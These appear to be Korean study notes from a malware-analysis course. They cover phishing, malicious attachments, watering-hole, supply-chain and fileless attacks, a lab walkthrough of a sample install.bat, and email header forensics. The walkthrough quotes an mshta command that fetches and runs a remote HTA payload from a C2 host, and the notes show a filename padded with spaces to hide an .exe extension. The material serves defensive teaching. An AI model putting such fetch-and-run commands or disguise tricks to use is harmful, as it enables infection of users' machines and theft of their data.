

# 4. 악성코드 전파 과정
## 4.1 전자메일 통한 공격 과정
- 메일 서비스를 통해 메일 수신자 직-간접적인 피해 유발
- 최근 사이버 공격 방식 중 가장 높은 비중을 차지
- 사회공학적 기법을 이용한 APT 공격

전세계 80%가 이메일을 통해 전파가 된다.

### 피싱 메일
피싱 메일들은 유명한 서버와 비슷한 해커의 dns로 이동하게 된다.   
그리고 로그인을 하는 홈페이지가 뜬다...     
아이디, 비밀번호를 입력하는 즉시 해커의 서버로 전송   
**목적 : 사용자의 크리덴셜 스터핑을 수집하기 위함**

### 스피어 피싱 메일 공격

1단계. 정상 메일로 신뢰 구축    
2단계. 해킹 메일 발송

### 악성파일 첨부 사례(매크로 사용 유도)
악성파일 첨부 :    
- 매크로(워드)       
- OLE 기능(HWP) : 지금도 OLE 개체가 있는 한글 파일을 열면 보안  허용 여부 팝업창을 띄움. 허용을 누르는 즉시 악성코드 감염    
- 실행파일(exe) : 저작권 위반 위장으로 악성파일을 보냄   
등을 첨부하여 악성코드 설치 유도    
    - 보안장비를 우회할려는 목적으로 파일에 암호를 걸어 보냄.
    - 파일 이름에 확장자를 붙이고 띄어쓰기를 엄청 해서 뒷부분 확장자 명을 안보이게 함.
```
ex) `사이버경찰청고소장.doc                              .exe
```

## 4.2 홈페이지를 통한 공격 과정
워터링홀 공격 :    
사용자들이 자주 접속하는 웹페이지 내 악성코드를 삽입하여 공격

1. 해커는 공격 대상의 업무, 취미를 파악
2. 공격 대상이 자주 방문하는 웹사이트 해킹ㆍ악성코드 삽입, 악성문서 업로드
3. 해당 웹사이트 접속
4. PC 내 취약점 존재 시 접속만으로도 악성코드 감염 또는 악성문서 열람으로 악성코드 감염
5. 키로깅, 문서 유출 등 개인ㆍ업무 정보 탈취

공격 대상들이 자주 접속하는 웹사이트 해킹    
정상 자바스크립트 라이브러리에 은밀하게 C&C서버 접속 코드 삽입   
피해자PC 내 정상 언어 프로그램 설치 후 맞춤형 스크립트 실행    
최종적으로 키보드 입력, 브라우저 쿠키, PC IP 정보 등 다양하게 정보 탈취

## 4.23 공급망 통한 공격 과정
공급망(=패치서버 등)침투 후 공격 대상들에게 패치 위장 파일 유포
- 소프트웨어 개발 과정 오염, 코드 서명 인증서 탈취 등

SW 개발 서버    
업데이트 서버   
관리 서버   
개발자 PC

간혹가다 시큐리티 홀이 있는 보안 솔루션이 있음    
예시. 크라우드 스트라이크 블루스크린 사건

가장 트렌드 있는 공격 방식

# 5. 최근 악성코드 동향

## 5.1 드롭퍼(Droppeer) 공격 방식
- 실행 파일 내 악성코드가 포함되어 있는 공격 방식(<->Loader)
- 내부에 악성코드가 압출된 형태로 안티 바이러스 탐지 어려움
- 주로 동적 분석 과정에서 샘플링 후 분석 가능

드롭퍼 : 실제 악성코드를 품고 있다.   

1. 특정 공직자 사칭하여 자문의뢰서 실행 유도
2. 한글문서 위장 파일

결국 백그라운드에서 프로그램 지속성을 유지하기 위한 행위   

## 5.2 파일리스(Fileless) 공격 방식★
- 안티 바이러스(AV)와 같은 보안장비를 우회하기 위한 공격 방식
- 파일이나 흔적이 남아있지 않아 분석 어려움
- 악성코드 주로 메모리에 준재하여 휘발성 데이터 수집 후 분석

워터링홀, 스피어 피싱, 스팸메일 등등

악성 행위를 가진 파일을 실행되게 하는 악성 스크립트

작업 스크립트에 등록하여 악성 스크립트를 계속 작성되게 하는 것

악성코드에 감염이 되면 PC를 끄지 말라고 한다.   
메모리단에서 동작하는 것도 증적자료로 사용하기 위해

---
### 문제 설명
한글문서 파일이 있고,   
디버깅을 해봤더니 스크립트들(파워쉘, 비주얼베이직)이 있더라   
이 스크립트들은   
구글 드라이브 닷컴에서 이런 스크립트를 불러오드러라

악성 페이로드는 메모리에 올라가고   
메모리 특정 주소에 올라간다

어떤 방식으로 메모리에 올라가냐?

주로 악성코드는 윈도우에서 돌고 있는 정상 프로세스를 강제로 실행시켜서  

정상 프로세스 특정 주소에 api 함수를 이용해   
메모리 주소를 확보하고 거기에 페이로드를 작성한다

그럼 정상프로세스가 호출된거기 때문에 탐지가 어렵다.   
탐지가 어려워서 분석도 어렵다..

분석가도 어렵게 하고, 자기의 페이로드도 안걸리게 하는   
굉장히 유용한 공격 방식이다

## 5.3 문서형 APT 공격 방식
- 악성코드가 실행 파일(.exe)가 아닌 문서 파일(.hwp .doc .xlsx등)로 유포
- 문서 내부 동작 매커니즘으로 악성코드가 동작하는 방식
- MS Office Macro, Hwp OLE, PDF Script 등
- 주로 악성코드를 불러오는 Loader 역할로 활용

주로 국내는    
한글 or MS workd   
교모하게 악성 스크립트를 exploit 해서    
매크로가 동작할 수 있도록   
컨텐츠 사용 버튼을 누른다면?    
파워쉘 스크립트가 동작해서   
파워쉘 스크립트가 연결되서     
쉘코드가 메모리에 받아온다   

악성코드 최종 페이로드(키보드 입력 정보 수집, 화면 캡처, PC 암호화)는 PC에서 거의 찾을 수 없다.

근데 메모리에서는 찾을 수 있다   
그래서 악성코드는 메모리 영역을 공부를 잘 해야 한다

- 최근 빠른 보안 패치로 문서형 악성코드 비중 과거 대비 감소
- OLE 개체를 이용한 APT 공격 여전히 활발하게 시도

OLE 개체 안에 악성 스크립트가 있어서 허용 팝업을 누르면 악성 스크립트 동작



### everything
파일 경로에 생성이 되면 everything에 생성이 될 것

### MooO FileMonitor
작성 : 파일이 write
수정 : modify
삭제 : delete

## Sample 1
install.bat 파일을 notepad로 확인이 가능하기 때문에 열어봄   
avast 백신 프로그램이 존재하는지 확인하기 위한 for문   
avp 백신 프로그램이 존재하는지 확인하기 위한 for문   

없을 경우에는    
winword.exe 프로세스 종료시키고    
template 폴더에 ~~링크에 있는 파일을 다운시켜서 저장

start mshta https://~~~/32.hta 다운로드 받아서 동작을 시킨다



monitor 캡쳐 시작하고 install.bat 파일 실행    
IBM 설치 프로그램 설치 함.   
32.hta 라는 빈 프로그램이 나옴.   

Process tree를 보면    
cmd.exe 실행된 걸 보면 cmd 파일로 시작이 된다는 것을 알 수 있음   
그 다음이 update.exe 파일을 실행이 되었음.   
그리고 백신 프로그램 2개 체크하는 걸 cmd를 이용해서 확인했음    
그리고 mshta 프로세스가 동작하면서 https://~~/32.hta라는 c2서버 연결을 시도 했음    

그럼 실제로 C2 서버 연결 시도했는지 wireshark로 확인해

mshta.exe 필터 2개 걸어서    
show network activity 봤는데 없네

wireshark로 찾아보니 움직인 경로는 있음


# 악성코드 분석 방법론
## 이메일 헤더란?
- 메일 발송자의 위치에서부터 시작하여 각 서버를 거쳐 최종적으로 수신자에게 오는 동안의 과정을 기록
- 분석가는 해커가 발송한 메일을 역추적하기 위해 반드시 확인 필요
- 이메일 헤더에는 다양한 필드들이 존재    
ex) From, To, Cc, Subject, Reply-To, Received, Message-ID, X- 등

## 이메일 헤더 필드
- To
    - "수신인" 또는 "받는 사람" 입력한 내용이 To 헤더에 기록
- Cc
    - 다른 사람이 메시지를 참조해서 읽으라고 보내는 경우 사용
- Bcc
    - 숨은 참조로 여러 사람에게 보낼 때 참조인 주소를 숨기기 위해 사용
- **From**
    - 보내는사람 주소 입력, 임의의 주소라도 적지 않을 경우 메시지 작성 불가
    - 임의의 주소를 적으면 되기 때문에 <U>해커는 자신의 주소가 아닌 가짜 주소를 입력</U>
    ex) From : 경찰철 \<admin@police.co.kr> -> 조작 가능   
    l -> 1   
    l -> I
- Reply-To
    - 수신한 메일을 회신할 때 우선적으로 Reply-To에 설정된 주소로 회신
- **Received**
    - 수신한 메일이 어디에서부터 어디를 거쳐 왔는지 표시하는 헤더
    - 헤더 부분의 맨 하단에서 거꾸로 하나씩 올라가면서 역추적
    - 발신지서버 by 수신지서버 with 
- **Return-Path**
    - 메일 전송 실패 시 반송되는 주소, 주로 송신자(해커)의 메일 주소를 입력   
    ex) Return-Path : \<hacker@naver.com>
- **'X-' 헤더**
    - MIME 규칙을 따르지 않는 비표준 헤더, 임의로 붙여지는 헤더
    - 실제 발송IP, 실제 발송 계정, 발송 응용 프로그램명 등 중요한 단서 포함   
    ex) X-Original-MAILFROM: hacker@hanmail.net   
    x-Mailer: PHPMailer 5.2.9   
    X-Origination-IP: [119.199.57.244]
- Content-Type
    - 메일 본문이 어떤 형식인지 알 수 있음   
    ex) text/plain(일반 문자열), multipart/alternative(일반 문자열, html) 등

- Received 추적
    - Received 헤더는 아래에서부터 역순으로 메일서버들을 거쳐 오기 때문에 이를 분석하면 역추적 가능
- 'X-' 헤더 추적
    - 비표준형 헤더 내 X-Origination-IP는 실제 발송지 IP


## 이메일 
